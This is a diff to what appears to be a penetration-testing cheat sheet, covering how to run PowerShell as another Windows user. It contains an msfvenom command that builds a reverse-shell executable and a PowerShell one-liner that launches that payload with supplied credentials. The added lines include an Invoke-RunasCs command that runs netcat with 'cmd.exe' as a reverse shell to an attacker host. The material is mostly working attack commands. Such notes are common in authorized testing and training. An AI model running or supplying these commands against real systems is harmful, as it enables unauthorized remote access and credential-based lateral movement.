@@ -38,15 +38,21 @@ MSFVenom Reverse Shell Payload
 msfvenom -p windows/shell_reverse_tcp lhost=<attacker ip> lport=<attacker listening port> -f exe > rev.exe
 ```
 
-:label: Running PowerShell as another user
+:label: Running PowerShell as another user (switch user in Windows)
 
-reverse shell with credential
+Method 1: reverse shell with credential
 
 ```cmd
 REM create payload
 msfvenom -p windows/shell_reverse_tcp lhost=<attacker ip> lport=<attacker listening port> -f exe > rev.exe
 REM change user, password and payload
 powershell -c "$password = ConvertTo-SecureString '<password>' -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential('<user>', $password);Start-Process -FilePath "<payload>" -Credential $creds"
+```
+
+Method 2: [RunasCs](https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1)
+
+```powershell
+Invoke-RunasCs <username> <password> "cmd /c C:\users\public\nc.exe -e cmd.exe <attacker ip> <attacker port>"
 ```
 
 specify a computer name in the AD environment
